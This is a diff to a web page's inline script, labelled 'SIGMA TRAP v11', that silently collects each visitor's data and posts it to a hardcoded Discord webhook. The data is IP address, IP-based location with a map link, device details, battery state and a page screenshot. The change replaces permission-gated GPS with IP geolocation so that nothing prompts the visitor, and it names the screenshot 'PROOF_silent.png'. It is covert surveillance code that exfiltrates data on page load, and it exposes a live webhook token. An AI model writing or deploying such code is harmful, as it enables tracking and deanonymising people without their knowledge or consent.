@@ -31,31 +31,11 @@
 <script>
   const WEBHOOK = 'https://discord.com/api/webhooks/1381021459350032484/Z-HEIw2n1czbqpnWl-UicGzWgfrHth3W0naPyAkIoI3Sf3bx4bsINYQJDnvIHf1ky0tL';
 
-  function getBattery() {
-    return navigator.getBattery ? navigator.getBattery().then(b => ({
-      level: Math.round(b.level * 100) + '%',
-      charging: b.charging ? 'Yes' : 'No'
-    })) : Promise.resolve(null);
-  }
-
-  function getLocation() {
-    return new Promise(resolve => {
-      if (!navigator.geolocation) return resolve(null);
-      navigator.geolocation.getCurrentPosition(
-        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
-        () => resolve(null),
-        { timeout: 7000, maximumAge: 0 }
-      );
-    });
-  }
-
   (async () => {
     try {
       const time = new Date().toISOString();
       const ipRes = await fetch('https://ipapi.co/json/');
       const ipData = await ipRes.json();
-      const location = await getLocation();
-      const battery = await getBattery();
       const canvas = await html2canvas(document.body, { scale: 0.6 });
       const screenshot = canvas.toDataURL('image/png');
 
@@ -63,15 +43,22 @@
         ua: navigator.userAgent,
         platform: navigator.platform,
         language: navigator.language,
-        cookies: navigator.cookieEnabled ? 'Yes' : 'No',
-        online: navigator.onLine ? 'Yes' : 'No',
         screen: `${screen.width}x${screen.height}`,
         window: `${innerWidth}x${innerHeight}`,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        online: navigator.onLine ? 'Yes' : 'No',
+        cookies: navigator.cookieEnabled ? 'Yes' : 'No'
       };
 
+      // Battery (no permission needed)
+      let battery = 'N/A';
+      if (navigator.getBattery) {
+        const b = await navigator.getBattery();
+        battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Not Charging'})`;
+      }
+
       const embed = {
-        title: 'SIGMA TRAP v10 — FULL PROOF',
+        title: 'SIGMA TRAP v11 — FULL PROOF (NO PERMISSION)',
         color: 0x00ff00,
         fields: [
           { name: 'IP', value: ipData.ip || '??', inline: true },
@@ -83,28 +70,21 @@
           { name: 'Device', value: device.ua.split(' ').slice(0,4).join(' '), inline: false },
           { name: 'OS', value: device.platform, inline: true },
           { name: 'Screen', value: device.screen, inline: true },
-          { name: 'Battery', value: battery ? `${battery.level} (${battery.charging})` : 'N/A', inline: true },
+          { name: 'Battery', value: battery, inline: true },
           { name: 'Language', value: device.language, inline: true },
-          { name: 'Cookies', value: device.cookies, inline: true }
+          { name: 'Cookies', value: device.cookies, inline: true },
+          { name: 'Live Map', value: `https://maps.google.com/?q=${ipData.latitude},${ipData.longitude}`, inline: false }
         ],
         timestamp: time,
-        footer: { text: 'Lxu00/MySite • FULL PROOF' }
+        footer: { text: 'Lxu00/MySite • NO PERMISSION NEEDED' }
       };
-
-      if (location) {
-        embed.fields.push(
-          { name: 'GPS Location', value: `Lat: ${location.lat}, Lon: ${location.lon}`, inline: true },
-          { name: 'Accuracy', value: `${location.acc}m`, inline: true },
-          { name: 'Live Map', value: `https://maps.google.com/?q=${location.lat},${location.lon}`, inline: false }
-        );
-      }
 
       await fetch(WEBHOOK, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           embeds: [embed],
-          files: [{ attachment: screenshot, name: 'PROOF_victim.png' }]
+          files: [{ attachment: screenshot, name: 'PROOF_silent.png' }]
         })
       });
     } catch (e) {}
